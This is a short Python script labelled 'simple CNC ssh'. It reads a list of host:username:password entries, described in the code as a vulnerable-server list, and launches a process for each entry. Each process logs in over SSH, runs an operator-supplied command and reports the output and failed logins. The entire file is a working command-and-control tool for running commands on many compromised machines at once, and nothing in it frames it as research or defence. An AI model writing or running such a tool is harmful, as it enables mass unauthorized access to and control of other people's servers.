import sys
import os
import time
import socket
import paramiko
import time
import warnings
import multiprocessing
from termcolor import colored

if len( sys.argv ) < 2:
    print( "Usage: %s [COMMAND]" % sys.argv[0] )
    quit()

os.system( 'clear' )
print(colored("""simple CNC ssh""", "red"))
    
vulnlist = sys.argv[1]
target = sys.argv[2]
stdoutcheck = sys.argv[3]

targ = (target)
cmd = (targ)

file = open(vulnlist,"r")
total_servers = 0
fails = 0
Content = file.read()
CoList = Content.split("\n")
for i in CoList:
    if i:
        total_servers += 1 
print(colored("[%s] Servers In List!", "magenta") % (total_servers))

with open( vulnlist, "r" ) as fd:
    lines = fd.readlines()

def auth(creds):
    global fails
    global total_servers
    global stdoutcheck
    try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy( paramiko.AutoAddPolicy() )
            ssh.connect( creds[0], port=22, username=creds[1], password=creds[2], timeout=5)
            stdin, stdout, stderr = ssh.exec_command(cmd)
            stdout=stdout.readlines()
            if stdoutcheck == "y":
              print( colored( f"[~]command ran on {target} stdout: {stdout}\n", "green" ) )
              time.sleep(100)
              ssh.close()
            else:
              print( colored( f"[~]command ran on {target}", "green" ) )
              time.sleep(100)
              ssh.close() 
    except paramiko.ssh_exception.AuthenticationException:
            print( colored( "Failure! IP: %s User/Pass:%s/%s", "red" ) % (creds[0], creds[1], creds[2]) )
            fails += 1
            pass
    except socket.error:
            print( colored( "Down: %s", "red" ) % (creds[0]) )
            pass
    except Exception as Er:
            print(f"error: {Er} {creds}")
            pass
      

for line in lines:
    creds = line.strip().split( ":" )
    multiprocessing.Process( target=auth, args=(creds,) ).start()

